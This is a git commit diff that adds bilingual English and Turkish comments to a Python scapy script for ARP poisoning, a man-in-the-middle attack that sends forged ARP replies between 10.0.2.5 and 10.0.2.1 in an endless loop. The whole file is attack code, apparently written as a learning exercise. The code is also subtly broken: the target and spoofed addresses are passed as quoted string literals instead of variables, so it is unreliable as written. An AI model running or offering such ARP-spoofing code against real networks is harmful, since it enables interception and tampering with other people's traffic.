d9edfa8f25cee6d2c81487c1c2bd9f95f034ce18
ChGunay <chgunay3@gmail.com>
2021-04-01 17:39:05 +0300

    Update Mıtm--OrtadakiAdamSaldırısı.py

--- Mıtm--OrtadakiAdamSaldırısı.py
+++ Mıtm--OrtadakiAdamSaldırısı.py
@@ -13,11 +13,11 @@ def get_macaddress(ip):
 
 
 def arp_poising(target_ip, poisened_ip):
-    target_mac = get_macaddress(target_ip)
-    arp_scope = scapy.ARP(op=2, pdst= "target_ip", hwdst=target_mac, psrc = "poisined_ip" )
-    scapy.send(arp_scope)
+    target_mac = get_macaddress(target_ip)#We call the get_mac_address function to find the mac address of the target ip.--Hedef ipin mac adresini bulmak için get_macaddress işlevini çağırıyoruz.
+    arp_scope = scapy.ARP(op=2, pdst= "target_ip", hwdst=target_mac, psrc = "poisined_ip" )#In the scapy ARP function, we make op 2 in the properties and in this way we create a response, not a request.--Scapy ARP fonksiyonunda, özelliklerde op 2 yapıyoruz ve bu şekilde bir istek değil bir yanıt oluşturuyoruz.
+    scapy.send(arp_scope)#We send the packages created with the scapy.send function to the destinations.--Scapy.send fonksiyonu ile oluşturulan paketleri hedeflere gönderiyoruz.
 
-while True:
+while True:#We don't want our arp attack to end by sending only one packet, so we put it in an infinite loop.--Arp saldırımızın sadece bir paket göndererek bitmesini istemiyoruz, bu yüzden onu sonsuz bir döngüye koyuyoruz.
     arp_poising("10.0.2.5","10.0.2.1")
     arp_poising("10.0.2.1", "10.0.2.5")
     time.sleep(3)
